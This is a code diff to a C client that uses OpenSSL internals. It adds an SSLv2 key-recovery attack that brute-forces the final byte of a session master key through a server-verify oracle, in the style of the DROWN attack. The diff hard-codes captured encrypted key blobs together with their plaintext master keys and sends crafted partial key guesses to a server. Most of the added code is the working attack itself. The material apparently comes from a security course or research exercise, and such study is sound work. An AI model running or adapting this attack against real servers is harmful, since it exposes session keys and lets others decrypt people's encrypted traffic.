@@ -22,7 +22,7 @@ void ssl2_write_to_socket(SSL *s)
 	memcpy(wbuf + 2, buf, len);
 
 	// Send the message
-	BIO_write(s->wbio, (char *)wbuf, len + 2);
+	int sent_len = BIO_write(s->wbio, (char *)wbuf, len + 2);
 }
 
 /*
@@ -266,7 +266,8 @@ int recv_server_verify(SSL *ssl)
 	int result;
 
 	// Receive message from server
-	ssl2_read_from_socket(ssl);
+	// ssl2_read_from_socket(ssl);
+	// printf("Reading done\n");
 
 	// We use some internal SSL functions
 	// So we need to set some additional parameters in
@@ -285,6 +286,7 @@ int recv_server_verify(SSL *ssl)
 
 	// Save a temp copy of the received data
 	// because decryption is done in place
+
 	unsigned char *temp = malloc(ssl->s2->rlength);
 	memcpy(temp, ssl->s2->mac_data, ssl->s2->rlength);
 
@@ -308,6 +310,22 @@ int recv_server_verify(SSL *ssl)
 	free(mac);
 
 	return result;
+}
+
+int guess_master_key(SSL* ssl, unsigned char *res)
+{
+	// guess the last byte
+    for(int c = 0; c < 256; c++)
+    {
+		printf("Trying for c = %x\n", c);
+        ssl->session->master_key[ssl->session->master_key_length - 1] = (unsigned char)c;
+        if(recv_server_verify(ssl))
+        {
+            *res = c;
+            return 1;
+        }
+    }
+    return 0;
 }
 
 int main(int argc, char **argv)
@@ -352,7 +370,8 @@ int main(int argc, char **argv)
 	// Set cipers for the session
 	// Suppose key len is 16 bytes
 	// Found these by using 'openssl ciphers -v -ssl2'
-	SSL_set_cipher_list(ssl, "IDEA-CBC-MD5:RC2-CBC-MD5:RC4-MD5");
+	// SSL_set_cipher_list(ssl, "IDEA-CBC-MD5:RC2-CBC-MD5:RC4-MD5");
+	SSL_set_cipher_list(ssl, "DES-CBC3-MD5");
 
 	// Init socket buffer
 	ssl->init_buf = BUF_MEM_new();
@@ -368,6 +387,64 @@ int main(int argc, char **argv)
 
 	// TODO add master key guess here
 	// Needs encrypted key data in order to work
+	// Master-Key: 38C5BB48DF4CE118A04F246B6F01BB48732F5D752A2AE894
+	// unsigned char encrypted_key[256] = "\x5d\x8e\x44\xf7\x7b\x99\xd3\xa8\xbb\x28\x5c\x2e\x31\x4a\x4e\xf9" \
+	// 									"\x55\xe5\x1a\xc3\x2b\xb3\x01\x0e\x26\x3b\x21\x07\x05\xce\x07\x45" \
+	// 									"\x46\x12\x03\xd8\x47\x62\xfe\x1d\x1e\xaf\x9e\xba\xb4\xc0\xd3\x6b" \
+	// 									"\xd3\x6c\xaa\x5e\xc8\x79\xe8\x3c\xef\x62\x10\xc0\x71\x14\x4e\x5b" \
+	// 									"\x78\x7b\x4e\xa1\xc2\xc1\x3b\x6d\xc5\x1f\xf6\x22\x50\x42\x3d\x7b" \
+	// 									"\xc3\x40\xfe\x1d\x09\x6a\xad\x0b\xaa\x6e\x8f\xf8\x1b\xfc\x9a\xb7" \
+	// 									"\x2f\x37\x22\x67\x8e\xc6\x32\x6c\x27\x55\x34\xa3\xc7\x9b\x66\xbb" \
+	// 									"\xfb\x46\x7b\xe9\xdb\x3d\xf5\x57\x85\x5a\xe8\xdf\xb2\x43\xa9\x5a" \
+	// 									"\xa0\xd1\x7c\x43\x70\xb5\x76\x88\x10\xa9\x5c\x76\x58\xd3\xbe\xb8" \
+	// 									"\xe8\x42\xa6\x84\x12\xe3\x24\xbd\xcc\x5b\x5f\x30\x73\xf0\xf7\x23" \
+	// 									"\x57\x21\x98\x25\x4b\xd5\xda\xf4\xeb\x6a\x9d\x03\x67\x17\xc2\x78" \
+	// 									"\x70\x30\x1d\x27\x02\x0f\xa3\x75\xb7\xeb\x90\xd1\x74\x9e\x83\xa7" \
+	// 									"\x37\x0e\xba\xf9\xc8\x7d\x6f\x28\x96\x3d\x4c\xff\x72\x4f\x9a\xd7" \
+	// 									"\x3f\x22\x64\x42\xdf\x47\x25\x03\x56\x10\x26\x5e\x0e\x7e\x1e\xa2" \
+	// 									"\x59\x5d\x2a\xec\xa7\x17\x37\x6d\x0a\x36\x06\x61\xa6\xf7\x56\x62" \
+	// 									"\x3f\xc2\xe9\xd0\xb7\x19\x66\xac\xbb\xbd\x8e\xd9\xcf\xcd\x42\xb9";
+
+	// Master-Key: C5032E033360067CD8BEF29AFF375B63D0BD93AFBCD8C2F1
+	unsigned char encrypted_key[256] = "\x01\xf4\x4a\xce\xa4\x10\x06\x32\xa9\xb4\x98\x2b\xd6\x67\x6f\x21" \
+									"\xd8\xe9\xf4\xbc\x0f\x79\xaa\x3d\xf1\x4d\x76\x85\xe5\x91\xd3\xe9" \
+									"\x29\x1f\xa5\x38\x6f\x20\x51\x78\xf7\x89\x3e\xd2\xb4\x79\x40\x42" \
+									"\x43\x55\x0e\x7c\x19\xc3\x86\x67\x64\x40\xa6\xa1\x97\x48\xbb\xc1" \
+									"\x1a\x4f\x93\x2f\x70\xe2\xe9\x4a\xa4\x0e\x3d\x39\xc2\xa7\x9d\xa9" \
+									"\xa6\x0a\xa5\xc0\xf1\x23\x2f\xb0\x5c\x0d\x97\xe7\x24\x2d\x8d\x72" \
+									"\xeb\xc7\xc9\x28\x6a\x30\xf2\xf1\xf7\x2b\x3e\x9f\xd1\xb2\x5b\xf7" \
+									"\x78\x4e\x51\x85\x57\x51\x7b\x08\xd3\x75\x75\x3a\xf2\x57\x3d\x9b" \
+									"\x57\xe6\xfa\xd7\x90\x01\x55\xed\xde\x38\xb6\xd8\x0c\xf6\xd5\x76" \
+									"\x39\xf1\xfa\xf2\x22\x0f\x6d\x86\xdd\x1e\xfd\x28\xdc\xc7\x41\x7b" \
+									"\x1f\xcc\xef\xf2\xaf\x6c\x48\x2d\x26\x7f\x6d\x48\x9f\x90\xd2\x4a" \
+									"\x35\x4c\x35\x96\xbf\xae\xc3\xeb\x5f\x15\xe7\x69\xd4\x9d\x39\x5c" \
+									"\xd9\xae\x28\x45\x5e\x8e\x52\xc3\x83\x05\xa9\x2f\x53\xb8\x69\xd7" \
+									"\xcf\x3d\x8f\x66\x02\x1a\xae\x7d\xa9\xa5\x58\x12\x32\xb4\xc9\x8c" \
+									"\x76\xc6\xdc\xa6\x0d\x22\x21\x48\xe3\x91\x9a\xbd\x23\x8d\x68\xe5" \
+									"\xae\xec\xba\x5f\xe2\x8c\x86\xd0\xe3\x8b\x8b\x87\x9a\x66\xa9\x3d";
+
+	unsigned char keysize = 24;
+	unsigned char guess_array[keysize*2];
+    memset(guess_array, 0, keysize*2);
+    unsigned char *master_key_guess = guess_array;
+
+	printf("Sending master key guess...\n");
+	send_master_key_guess(ssl, master_key_guess, keysize - 1, encrypted_key, 256);
+	printf("Master key guess sent!\n");
+	ssl->s2->clear_text=0;
+    assert(ssl2_enc_init(ssl, 1) == 1);
+	ssl2_read_from_socket(ssl);
+	printf("Reading done\n");
+
+	// Get last byte
+	printf("Guessing master key...\n");
+	res = guess_master_key(ssl, &master_key_guess[keysize - 1]);
+	printf("Done guessing! res = %d\n", res);
+
+	if(!res)
+	{
+		return 0;
+	}
 
 	SSL_CTX_free(ssl->ctx);
 	SSL_free(ssl);
